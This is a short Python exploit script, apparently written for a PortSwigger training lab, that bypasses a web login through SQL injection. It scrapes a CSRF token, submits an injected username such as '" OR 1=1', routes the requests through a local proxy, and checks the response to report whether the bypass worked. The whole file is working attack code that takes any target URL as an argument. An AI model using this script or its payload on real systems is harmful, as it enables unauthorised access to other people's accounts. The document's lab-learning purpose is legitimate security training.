#!/usr/bin/python3

#by Davinci
#SQL injection vulnerability allowing login bypass
#https://portswigger.net/

from pwn import *
import requests
import sys
import signal
import urllib3
from bs4 import BeautifulSoup #To parser out the response with r.text and html.parser
import pdb

#UrlwarningDisable
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#fuction_ctrl

def ctrl_function(sig, frames):
	print("\n[!]Saliendo....\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_function)

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def get_csrf(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text , 'html.parser')
	csrf = soup.find("input")['value']
	return csrf


def sqli_exploit(s, url, sql_payload):
	csrf = get_csrf(s, url)
	data_post = { "csrf" : csrf, 
				  "username": sql_payload, 
				  'password': 'password'}

	r = s.post(url, data=data_post, verify=False, proxies=proxies)
	response = r.text
	if "Email" in response:
		return True
	else:
		return False

bar = log.progress("[!] Preparando Injection")
bar.status("[!] Iniciando")

def helPanel():
	print("[!] Uso: %s <url> <Sql_paylodad>" % sys.argv[0])
	print('[!] python3 Lab2.py www.mipagina.com" OR 1=1"')
	sys.exit(1)

        #keep the sesion up working with cookies, csrf oken etc.


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		sql_payload = sys.argv[2].strip()
	except:
		helPanel()

	s = requests.Session() 

	if sqli_exploit(s, url, sql_payload):
		print("[!]Injection Exitosa")
	else:
		print("[!]Injection No exitosa")
